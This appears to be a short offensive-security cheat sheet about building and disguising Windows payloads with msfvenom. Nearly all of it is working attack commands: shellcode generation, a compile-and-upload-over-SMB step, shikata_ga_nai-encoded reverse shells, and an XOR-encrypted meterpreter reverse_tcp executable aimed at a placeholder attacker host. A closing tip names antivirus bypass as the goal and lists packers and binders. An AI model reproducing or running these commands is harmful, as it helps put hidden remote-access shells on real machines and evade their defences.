### Tools: Command and Control Frameworks, msfvenom, powercat

# GENERATE SHELLCODE USING PUBLIC TOOLS

### example:

#### 1) msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c

#### 2) Write a C program

#### 3) i686-w64-mingw32-gcc calc.c -o calc-MSF.exe

#### 4) smbclient -U USER '//IP/Tools'

#### put calc-MSF.exe

### Another example

#### 1) msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin

#### 2) xxd -i /tmp/example.bin

## ENCODING WITH MSFVENOM

#### 1) msfvenom --list encoders | grep excellent

#### 2) msfvenom -a x86 --platform windows LHOST=ATTACK_IP LPORT=PORT -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i NUM -f EXTENSION

## ENCRYPTING WITH MSFVENOM

#### 1) msfvenom --list encrypt

#### 2) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACK_IP LPORT=PORT -f exe --encrypt xor --encrypt-key "KEY" -o xoredrevshell.exe

# TIP: THESE METHODS WON'T WORK OUT OF THE BOX! DO SOME WOMBO COMBOS WITH OTHER TECHNIQUES OR REVERSE ENGINEER THE PAYLOAD FOR A SUCCESSFUL ANTIVIRUS BYPASS!!!

## Summary:

### 1) Encoding

### 2) Encryption

### 3) Packers

### 4) Binders
